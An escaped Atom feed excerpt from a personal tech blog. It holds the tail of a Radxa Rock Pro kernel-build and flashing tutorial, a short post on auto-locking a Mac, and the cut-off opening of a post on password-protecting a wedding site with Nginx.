&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; ..
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;dl.radxa.com&amp;#x2F;rock_pro&amp;#x2F;images&amp;#x2F;ubuntu&amp;#x2F;sd&amp;#x2F;radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.zip
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;unzip radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.zip
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After having the SD Card .img file, we need to find out where it’s ext4 partition starts in order to load it to our Ubuntu. We will do it using &amp;quot;parted&amp;quot; we installed in the pre-requirements:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;parted radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;unit B
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;print
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;quit
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;You should see a table containing the start offset of the ext4 partition, which looks kind of like this:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;Number Start End Size Type File system Flags  
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;1 33554432B 1082130431B 1048576000B primary ext4
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Use the start number we found before to mount the ext4 partition:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkdir ubuntu_sdcard
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo mount -o offset=33554432 radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img ubuntu_sdcard
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;If everything went well, ubuntu_sdcard now points to the ext4 partition in the SD card image file. We should now copy the modules and firmware into the ext4 partition:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo mkdir .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo cp -r linux-3.18.11&amp;#x2F;modules&amp;#x2F;lib&amp;#x2F;modules&amp;#x2F;3.18.11&amp;#x2F; .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo mkdir .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;firmware
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo cp -r linux-3.18.11&amp;#x2F;firmware&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;firmware&amp;#x2F;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Also, CNX-Software suggested (and I agree) to configure DHCP to the Ethernet port on boot:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo vi .&amp;#x2F;ubuntu_sdcard&amp;#x2F;etc&amp;#x2F;network&amp;#x2F;interfaces
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And add the following 2 lines:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;auto eth0 iface eth0 inet dhcp
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Also, CNX-Software claims you need a script to detect rootfs at boot time. I used it, don’t know if it matters:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo vi .&amp;#x2F;ubuntu_sdcard&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin&amp;#x2F;mtd-by-name.sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And copy the following into the file:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;sh -e
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# mtd-by-name link the mtdblock to name
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# radxa.com, thanks to naobsd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rm -rf &amp;#x2F;dev&amp;#x2F;block&amp;#x2F;mtd&amp;#x2F;by-name&amp;#x2F;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkdir -p &amp;#x2F;dev&amp;#x2F;block&amp;#x2F;mtd&amp;#x2F;by-name
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ls -d &amp;#x2F;sys&amp;#x2F;class&amp;#x2F;mtd&amp;#x2F;mtd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;9&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;]&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;do
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;name&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;`cat $i&amp;#x2F;name`
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;tmp&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sed -e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;s&amp;#x2F;mtd&amp;#x2F;mtdblock&amp;#x2F;g&amp;amp;#39;`&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;dev&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$tmp &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sed -e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;s&amp;#x2F;\&amp;#x2F;sys\&amp;#x2F;class\&amp;#x2F;mtdblock&amp;#x2F;\&amp;#x2F;dev&amp;#x2F;g&amp;amp;#39;`&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ln -s $dev &amp;#x2F;dev&amp;#x2F;block&amp;#x2F;mtd&amp;#x2F;by-name&amp;#x2F;$name
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;done
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Make sure the script is executable and edit the startup script:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo chmod +x .&amp;#x2F;ubuntu_sdcard&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin&amp;#x2F;mtd-by-name.sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo vi .&amp;#x2F;ubuntu_sdcard&amp;#x2F;etc&amp;#x2F;rc.local
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And add the line below before &amp;lt;em&amp;gt;exit 0:&amp;lt;&amp;#x2F;em&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin&amp;#x2F;mtd-by-name.sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;That’s it. Let’s unmount the ext4 partition:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo umount .&amp;#x2F;ubuntu_sdcard&amp;#x2F;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img should now contain your new files! You can download my compiled version &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;dl.dropboxusercontent.com&amp;#x2F;u&amp;#x2F;3819031&amp;#x2F;radxa_rock_pro_ubuntu_14.04_server_k3.18.11_150502_guylewin_sdcard.rar&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;flashing-sd-card-image&amp;quot;&amp;gt;Flashing SD Card Image&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;To flash the newly created image, you should use &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;sourceforge.net&amp;#x2F;projects&amp;#x2F;win32diskimager&amp;#x2F;&amp;quot;&amp;gt;Win32DiskImager&amp;lt;&amp;#x2F;a&amp;gt; if you’re on Windows (simply follow the GUI).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If you’re on Linux &amp;#x2F; OS X, you can use the dd command using this syntax (replace &amp;lt;em&amp;gt;&amp;#x2F;dev&amp;#x2F;sdc&amp;lt;&amp;#x2F;em&amp;gt; with your SD card writer device):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo dd if=radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img of=&amp;#x2F;dev&amp;#x2F;sdc
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Now take out your MicroSD card and put it in the Rock Pro. It will be necessary for boot after we flash the device.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;flashing-the-kernel&amp;quot;&amp;gt;Flashing the Kernel&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Connect the device to your computer via USB, and follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;radxa.com&amp;#x2F;Rock&amp;#x2F;Loader_mode&amp;quot;&amp;gt;these instructions&amp;lt;&amp;#x2F;a&amp;gt; to bring the Rock Pro to loader mode.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Get the parameter file describing kernel parameters by:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;dl.radxa.com&amp;#x2F;rock&amp;#x2F;images&amp;#x2F;parameter&amp;#x2F;parameter_linux_sd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Install rkflashtool to flash the Rock Pro:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;linux-rockchip&amp;#x2F;rkflashtool
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; rkflashtool
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo cp rkflashtool rkcrc rkunpack rkunsign &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And use it to flash boot.img and restart the device:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rkflashtool P &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; parameter_linux_sd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rkflashtool w boot &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; boot.img rkflashtool b
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Your device should now reboot into it’s new kernel, with rtl8187 support.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;And that’s it! If you have any questions, fixes, etc, feel free to contact me &amp;#x2F; comment.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Lock Mac After Inactivity</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-15-lock-mac-after-inactivity&#x2F;"/>
                <updated>2019-03-15T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-15-lock-mac-after-inactivity&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;Mac comes with a shortcut for locking the desktop session - &amp;lt;code&amp;gt;⌘ + Ctrl + Q&amp;lt;&amp;#x2F;code&amp;gt;. It is also possible to &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;maclovin.org&amp;#x2F;blog-native&amp;#x2F;2017&amp;#x2F;high-sierra-set-a-global-shortcut-to-lock-screen&amp;quot;&amp;gt;define another keyboard shortcut for that&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In my case, I wanted the screen to lock automatically after I’m idle for a certain period of time. That’s also easily configured by following these steps:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;Launch System Preferences -&amp;amp;gt; Desktop &amp;amp;amp; Screen Saver -&amp;amp;gt; Screen Saver&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Change the &amp;quot;Start after:&amp;quot; value in the left bottom corner to the requested idle time (in my case - 1 minute).&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;On System Preferences -&amp;amp;gt; Security &amp;amp;amp; Privacy -&amp;amp;gt; General - mark &amp;quot;Require password &amp;lt;strong&amp;gt;immediately&amp;lt;&amp;#x2F;strong&amp;gt; after sleep or screen saver begins&amp;quot;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;p&amp;gt;This was a good solution, but my workplace setup a group policy (by enforcing a configuration profile) that sets the &amp;quot;Start after&amp;quot; time in the screen saver pane to 20 minutes, which is &amp;lt;em&amp;gt;way&amp;lt;&amp;#x2F;em&amp;gt; too long for me.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;To solve that, I wrote this small cron task that checks your inactivity time, and launches the screen saver manually if enough time has passed. You can find the code + installation instructions &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;manual-screensaver-cron&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Securing Wedding Website with Nginx</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-11-securing-wedding-website-with-nginx&#x2F;"/>
                <updated>2025-01-11T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-11-securing-wedding-website-with-nginx&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;While planning my wedding, I found myself diving into an interesting technical challenge: how to share our Save the Date website with guests while keeping it private from the general public. This post details how I implemented a simple yet effective authentication system using Nginx, URL parameters, and cookies - without needing to modify the actual website content.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-challenge&amp;quot;&amp;gt;The Challenge&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;My partner created a beautiful HTML-based Save the Date website that we wanted to share exclusively with our wedding guests. While the content wasn&amp;#x27;t particularly sensitive, I preferred to keep it private and away from search engines. The catch? I wanted to maintain the website as pure HTML without adding any authentication code to the frontend.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-solution&amp;quot;&amp;gt;The Solution&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I developed a solution using Nginx that combines three key elements:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;A password embedded in the URL as a query parameter&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Browser cookie persistence for a smoother user experience&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Server-side validation using Nginx configuration&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;p&amp;gt;When guests receive our Save the Date link (e.g., &amp;lt;code&amp;gt;https:&amp;#x2F;&amp;#x2F;ourwedding.com&amp;#x2F;save-the-date?pwd=secretkey&amp;lt;&amp;#x2F;code&amp;gt;), Nginx validates the password, sets a persistent cookie, and redirects them to the clean URL. Future visits are authenticated via the cookie, eliminating the need for the query parameter.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;implementation-details&amp;quot;&amp;gt;Implementation Details&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;For this example, let&amp;#x27;s use &amp;lt;code&amp;gt;aabbccddeeffgg&amp;lt;&amp;#x2F;code&amp;gt; as our URL-friendly password. Here&amp;#x27;s the Nginx configuration that makes it all work:&amp;lt;&amp;#x2F;p&amp;gt;
